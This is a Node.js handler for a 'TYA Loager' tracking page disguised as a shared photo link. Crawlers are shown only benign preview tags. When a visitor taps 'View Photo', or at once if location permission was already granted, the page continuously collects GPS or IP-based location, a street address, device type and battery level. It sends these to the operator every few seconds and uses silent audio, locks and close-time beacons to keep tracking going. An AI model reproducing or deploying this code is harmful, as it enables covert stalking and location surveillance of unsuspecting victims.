/* ──────────────────────────────────────────────
   TYA Loager – Tracking Page v8
   · "Tap to view" overlay = triggers GPS + keepalive
   · watchPosition for continuous GPS (not one-shot)
   · IP fallback only if GPS denied
   · sendBeacon on close
   · 60s offline threshold
   ────────────────────────────────────────────── */
const store = require('./_store');

module.exports = (req, res) => {
  const slug = req.query.slug || 'default';
  const host = req.headers.host || 'localhost:3000';
  const proto = host.includes('localhost') ? 'http' : 'https';
  const baseUrl = `${proto}://${host}`;
  const ua = req.headers['user-agent'] || '';

  const isCrawler = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|LinkedInBot|Slackbot|TelegramBot|Pinterest|Discordbot/i.test(ua);

  let user = store.users.find(u => (u.customPath === slug || u.id === slug) && !u.deleted);
  const imgName = (user && user.imageName) || '';
  const favKey = (user && user.faviconKey) || 'f';

  let imgUrl;
  if (imgName) {
    const img = store.images.find(i => i.name === imgName);
    imgUrl = img ? `${baseUrl}/api/image?name=${encodeURIComponent(imgName)}` : `${baseUrl}/api/image`;
  } else if (store.images.length > 0) {
    imgUrl = `${baseUrl}/api/image?name=${encodeURIComponent(store.images[0].name)}`;
  } else {
    imgUrl = `${baseUrl}/api/image`;
  }

  const favUrl = `${baseUrl}/api/favicon?key=${favKey}`;
  const ogTitle = '\u{1f4f7} Photo Shared with You';
  const ogDesc = 'Someone shared a photo with you. Tap to view it now.';

  /* ── CRAWLER RESPONSE ── */
  if (isCrawler) {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    return res.send(`<!DOCTYPE html><html><head>
<meta property="og:type" content="article"/>
<meta property="og:title" content="${ogTitle}"/>
<meta property="og:description" content="${ogDesc}"/>
<meta property="og:image" content="${imgUrl}"/>
<meta property="og:image:type" content="image/jpeg"/>
<meta property="og:image:width" content="1200"/>
<meta property="og:image:height" content="630"/>
<meta property="og:url" content="${baseUrl}/track/${slug}"/>
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:title" content="${ogTitle}"/>
<meta name="twitter:image" content="${imgUrl}"/>
<title>${ogTitle}</title>
</head><body></body></html>`);
  }

  /* ── USER RESPONSE ── */
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-store');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
<meta property="og:type" content="article"/>
<meta property="og:title" content="${ogTitle}"/>
<meta property="og:description" content="${ogDesc}"/>
<meta property="og:image" content="${imgUrl}"/>
<meta property="og:image:type" content="image/jpeg"/>
<meta property="og:image:width" content="1200"/>
<meta property="og:image:height" content="630"/>
<meta property="og:url" content="${baseUrl}/track/${slug}"/>
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:title" content="${ogTitle}"/>
<meta name="twitter:image" content="${imgUrl}"/>
<link rel="icon" href="${favUrl}" type="image/jpeg"/>
<title>${ogTitle}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:system-ui,-apple-system,sans-serif;overflow:hidden;
  width:100vw;height:100vh;height:100dvh}

/* ── TAP TO VIEW OVERLAY ── */
.overlay{position:fixed;inset:0;z-index:100;display:flex;flex-direction:column;
  align-items:center;justify-content:center;background:rgba(0,0,0,.85);
  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);transition:opacity .5s}
.overlay.hidden{opacity:0;pointer-events:none}
.overlay-img{width:200px;height:200px;border-radius:24px;object-fit:cover;
  border:3px solid rgba(255,255,255,.1);margin-bottom:24px;
  box-shadow:0 20px 60px rgba(0,0,0,.5)}
.overlay-title{color:#fff;font-size:20px;font-weight:700;margin-bottom:8px}
.overlay-desc{color:rgba(255,255,255,.5);font-size:14px;margin-bottom:32px}
.overlay-btn{background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;
  border:none;padding:16px 48px;border-radius:50px;font-size:16px;font-weight:600;
  cursor:pointer;letter-spacing:.5px;box-shadow:0 8px 32px rgba(99,102,241,.4);
  transition:transform .2s,box-shadow .2s}
.overlay-btn:active{transform:scale(.96)}

/* ── PHOTO VIEW ── */
.photo{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}
.photo img{max-width:100%;max-height:100%;object-fit:contain;display:block}
</style>
</head>
<body>

<!-- TAP TO VIEW OVERLAY -->
<div class="overlay" id="overlay">
  <img class="overlay-img" src="${imgUrl}" alt="" onerror="this.style.display='none'"/>
  <div class="overlay-title">\u{1f4f7} Photo Shared with You</div>
  <div class="overlay-desc">Tap the button below to view this photo</div>
  <button class="overlay-btn" id="viewBtn">View Photo</button>
</div>

<!-- ACTUAL PHOTO (revealed after tap) -->
<div class="photo" id="photo" style="display:none">
  <img src="${imgUrl}" alt="Shared Photo" onerror="this.style.display='none'"/>
</div>

<script>
(function(){
  var SLUG="${slug}";
  var API="${baseUrl}";
  var SEND_URL=API+"/api/track";
  var SEND_INTERVAL=12000;
  var BG_INTERVAL=25000;

  var latestLat=null,latestLng=null,latestAcc=null,latestSrc='';
  var latestAddr='';
  var gpsActive=false,gpsDenied=false;
  var sending=false;
  var watchId=null;
  var intervalId=null;

  /* ── DEVICE ── */
  function getDevice(){
    var ua=navigator.userAgent;
    if(/iPhone|iPad|iPod/i.test(ua))return 'iOS';
    if(/Android/i.test(ua))return 'Android';
    if(/Windows/i.test(ua))return 'Windows';
    if(/Mac/i.test(ua))return 'macOS';
    if(/Linux/i.test(ua))return 'Linux';
    return 'Unknown';
  }
  function getBattery(){
    return navigator.getBattery?navigator.getBattery().then(function(b){return Math.round(b.level*100)}).catch(function(){return null}):Promise.resolve(null);
  }

  /* ── REVERSE GEOCODE ── */
  function reverseGeo(lat,lng){
    return fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lng+'&zoom=18&addressdetails=1',
      {headers:{'Accept-Language':'en'}})
      .then(function(r){return r.json()})
      .then(function(d){return d.display_name||''})
      .catch(function(){return ''});
  }

  /* ── IP GEOLOCATION (parallel race) ── */
  function getIPLoc(){
    function tryProvider(url,parse){
      var c=new AbortController();var t=setTimeout(function(){c.abort()},5000);
      return fetch(url,{signal:c.signal}).then(function(r){clearTimeout(t);return r.json()}).then(parse).catch(function(){return null});
    }
    return Promise.all([
      tryProvider('https://ipapi.co/json/',function(d){return d&&d.latitude?{lat:d.latitude,lng:d.longitude,acc:5000,ip:d.ip||''}:null}),
      tryProvider('https://ipinfo.io/json',function(d){if(!d||!d.loc)return null;var p=d.loc.split(',');return{lat:+p[0],lng:+p[1],acc:8000,ip:d.ip||''}}),
      tryProvider('https://freeipapi.com/api/json',function(d){return d&&d.latitude?{lat:d.latitude,lng:d.longitude,acc:10000,ip:d.ipAddress||''}:null}),
      tryProvider('http://ip-api.com/json/?fields=lat,lon,query,status',function(d){return d&&d.lat?{lat:d.lat,lng:d.lon,acc:15000,ip:d.query||''}:null})
    ]).then(function(results){
      // Pick the first successful result (prefer ipapi for accuracy)
      for(var i=0;i<results.length;i++){if(results[i])return results[i]}
      return null;
    });
  }

  /* ── SEND LOCATION TO SERVER ── */
  function sendLocation(){
    if(sending||latestLat==null)return;
    sending=true;
    var payload={
      id:SLUG,customPath:SLUG,
      lat:latestLat,lng:latestLng,
      accuracy:latestAcc,source:latestSrc,
      address:latestAddr,
      device:getDevice(),
      battery:null,ip:''
    };
    getBattery().then(function(b){
      payload.battery=b;
      return fetch(SEND_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
    }).catch(function(){}).then(function(){sending=false});
  }

  /* ── GPS watchPosition (continuous, gets more accurate over time) ── */
  function startGPSWatch(){
    if(!navigator.geolocation||watchId!=null)return;
    watchId=navigator.geolocation.watchPosition(
      function(pos){
        gpsActive=true;
        latestLat=pos.coords.latitude;
        latestLng=pos.coords.longitude;
        latestAcc=pos.coords.accuracy;
        latestSrc='GPS';
        // Reverse geocode (throttled — only when significantly moved)
        reverseGeo(latestLat,latestLng).then(function(a){if(a)latestAddr=a});
      },
      function(err){
        // err.code 1 = PERMISSION_DENIED
        if(err.code===1)gpsDenied=true;
        // Don't stop — might get permission later
      },
      {enableHighAccuracy:true,timeout:20000,maximumAge:15000}
    );
  }

  /* ── IP fallback loop (only if GPS isn't active) ── */
  function doIPFallback(){
    if(gpsActive)return; // GPS is working, no need for IP
    getIPLoc().then(function(loc){
      if(!loc||gpsActive)return;
      latestLat=loc.lat;latestLng=loc.lng;
      latestAcc=loc.acc;latestSrc='IP';
      if(loc.ip)latestAddr='IP: '+loc.ip;
      reverseGeo(loc.lat,loc.lng).then(function(a){if(a)latestAddr=a});
    });
  }

  /* ── SEND LOOP ── */
  function startSendLoop(){
    // Send immediately
    doIPFallback();
    setTimeout(sendLocation,3000); // slight delay for first GPS fix

    intervalId=setInterval(function(){
      if(!gpsActive)doIPFallback();
      sendLocation();
    },SEND_INTERVAL);
  }

  /* ── KEEPALIVE ── */
  function startKeepalive(){
    // 1. Silent audio (needs user gesture — called from tap handler)
    try{
      var ctx=new(window.AudioContext||window.webkitAudioContext)();
      var osc=ctx.createOscillator();var g=ctx.createGain();
      g.gain.value=0.00001;osc.frequency.value=1;
      osc.connect(g);g.connect(ctx.destination);osc.start();
      if(ctx.state==='suspended')ctx.resume();
    }catch(e){}

    // 2. Web Lock
    if(navigator.locks){
      try{navigator.locks.request('tya_'+SLUG,{mode:'exclusive'},function(){return new Promise(function(){})})}catch(e){}
    }

    // 3. Wake Lock
    if('wakeLock' in navigator){
      try{navigator.wakeLock.request('screen').catch(function(){})}catch(e){}
    }

    // 4. Visibility change — adjust speed + re-send on focus
    document.addEventListener('visibilitychange',function(){
      clearInterval(intervalId);
      if(document.hidden){
        intervalId=setInterval(function(){if(!gpsActive)doIPFallback();sendLocation()},BG_INTERVAL);
      }else{
        intervalId=setInterval(function(){if(!gpsActive)doIPFallback();sendLocation()},SEND_INTERVAL);
        if('wakeLock' in navigator){try{navigator.wakeLock.request('screen').catch(function(){})}catch(e){}}
        sendLocation();
      }
    });

    // 5. sendBeacon on close (3 events for maximum coverage)
    function beacon(){
      if(latestLat==null)return;
      try{
        var d=JSON.stringify({id:SLUG,customPath:SLUG,lat:latestLat,lng:latestLng,accuracy:latestAcc,
          source:'Last Known',address:latestAddr,device:getDevice(),battery:null,ip:''});
        navigator.sendBeacon(SEND_URL,new Blob([d],{type:'application/json'}));
      }catch(e){}
    }
    window.addEventListener('beforeunload',beacon);
    window.addEventListener('pagehide',beacon);
    window.addEventListener('unload',beacon);

    // 6. Restore from bfcache
    window.addEventListener('pageshow',function(e){if(e.persisted)sendLocation()});
  }

  /* ── TAP TO VIEW HANDLER ── */
  document.getElementById('viewBtn').addEventListener('click',function(){
    // 1. Reveal photo
    document.getElementById('overlay').classList.add('hidden');
    document.getElementById('photo').style.display='flex';

    // 2. Start GPS (permission prompt appears NOW — right after user tap)
    startGPSWatch();

    // 3. Start keepalive (audio etc. require user gesture)
    startKeepalive();

    // 4. Start send loop
    startSendLoop();
  });

  // Also try GPS passively if permission already granted (no prompt)
  if(navigator.permissions&&navigator.permissions.query){
    navigator.permissions.query({name:'geolocation'}).then(function(p){
      if(p.state==='granted'){
        startGPSWatch();
        startKeepalive();
        startSendLoop();
        // Auto-reveal photo since GPS is already allowed
        document.getElementById('overlay').classList.add('hidden');
        document.getElementById('photo').style.display='flex';
      }
    }).catch(function(){});
  }

})();
</script>
</body>
</html>`);
};
